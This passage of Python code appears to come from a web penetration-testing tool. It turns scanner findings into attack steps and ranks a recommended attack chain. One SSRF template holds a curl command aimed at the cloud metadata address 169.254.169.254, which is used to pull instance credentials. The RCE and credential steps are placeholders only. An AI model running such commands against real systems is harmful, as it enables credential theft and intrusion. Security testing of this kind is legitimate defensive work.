                "description": finding.get("description", "SSRF vulnerability found."),
                "likelihood": Likelihood.HIGH,
                "impact": impact,
                "ease": "Medium",
                "commands": [f"curl '{target_url}/fetch?url=http://169.254.169.254/latest/meta-data/'"],
                "modules": ["ssrf"],
                "prerequisites": [],
                "mitigations": ["URL validation"],
            }
        if "rce" in title or "remote code" in title:
            return {
                "phase": Phase.INITIAL_ACCESS,
                "attack": f"Exploit: {finding.get('title', 'RCE')}",
                "description": finding.get("description", "Remote code execution vulnerability found."),
                "likelihood": Likelihood.HIGH,
                "impact": impact,
                "ease": "Medium",
                "commands": [f"# RCE exploit for: {finding.get('title', 'unknown')}"],
                "modules": ["rce", "command_injection"],
                "prerequisites": [],
                "mitigations": ["Input validation", "Least privilege"],
            }
        if "credential" in title or "password" in title or "secret" in title:
            return {
                "phase": Phase.EXFILTRATION,
                "attack": f"Exploit: {finding.get('title', 'Credential Exposure')}",
                "description": finding.get("description", "Exposed credentials found."),
                "likelihood": Likelihood.HIGH,
                "impact": impact,
                "ease": "Easy",
                "commands": [f"# Use exposed credentials: {finding.get('title', '')}"],
                "modules": ["sensitive_exposure"],
                "prerequisites": [],
                "mitigations": ["Rotate credentials", "Remove from codebase"],
            }
        return None

    # ------------------------------------------------------------------
    # Summary and chain
    # ------------------------------------------------------------------
    def _build_summary(self, steps: list[AttackStep], stack: TechStack, context: AttackContext) -> dict[str, Any]:
        phase_counts: dict[str, int] = {}
        likelihood_counts: dict[str, int] = {}
        impact_counts: dict[str, int] = {}
        module_set: set[str] = set()

        for step in steps:
            phase_counts[step.phase] = phase_counts.get(step.phase, 0) + 1
            likelihood_counts[step.likelihood] = likelihood_counts.get(step.likelihood, 0) + 1
            impact_counts[step.impact] = impact_counts.get(step.impact, 0) + 1
            module_set.update(step.modules)

        critical_attacks = sum(1 for s in steps if s.impact == "CRITICAL")
        high_attacks = sum(1 for s in steps if s.impact == "HIGH")

        return {
            "total_steps": len(steps),
            "phase_distribution": phase_counts,
            "likelihood_distribution": likelihood_counts,
            "impact_distribution": impact_counts,
            "critical_attacks": critical_attacks,
            "high_attacks": high_attacks,
            "applicable_modules": sorted(module_set),
            "tech_stack_summary": {
                "frameworks": stack.frameworks,
                "servers": stack.servers,
                "languages": stack.languages,
                "databases": stack.databases,
                "cloud": stack.cloud,
                "cdn": stack.cdn,
            },
            "context": {
                "parameters": context.parameters[:20],
                "forms": len(context.forms),
                "api_endpoints": context.api_endpoints[:20],
                "graphql_endpoints": context.graphql_endpoints[:20],
                "file_uploads": context.file_uploads[:20],
                "auth_endpoints": context.auth_endpoints[:20],
                "debug_endpoints": context.debug_endpoints[:20],
                "real_findings": len(context.real_findings),
            },
        }

    def _recommend_chain(self, steps: list[AttackStep]) -> list[str]:
        """Recommend an attack chain: high-impact + high-likelihood first."""
        scored = []
        likelihood_score = {"VERY_HIGH": 5, "HIGH": 4, "MEDIUM": 3, "LOW": 2, "VERY_LOW": 1}
        impact_score = {"CRITICAL": 5, "HIGH": 4, "MEDIUM": 3, "LOW": 2, "INFO": 1}

        for step in steps:
            if not step.modules:
                continue
            score = likelihood_score.get(step.likelihood, 0) + impact_score.get(step.impact, 0)
            scored.append((score, step))

        scored.sort(key=lambda x: x[0], reverse=True)
        return [s.attack for _, s in scored[:10]]

    # ------------------------------------------------------------------
    # Serialization
    # ------------------------------------------------------------------
    def _step_to_dict(self, step: AttackStep) -> dict[str, Any]:
        return {
            "id": step.id,
            "phase": step.phase,
            "attack": step.attack,
            "description": step.description,
            "likelihood": step.likelihood,
            "impact": step.impact,
            "ease": step.ease,
            "commands": step.commands,
            "modules": step.modules,
            "prerequisites": step.prerequisites,
            "mitigations": step.mitigations,
            "references": step.references,
            "requires": step.requires,
            "vulnerability_type": step.vulnerability_type,
            "category": step.category,
            "priority": step.priority,
            "context_reason": step.context_reason,
        }
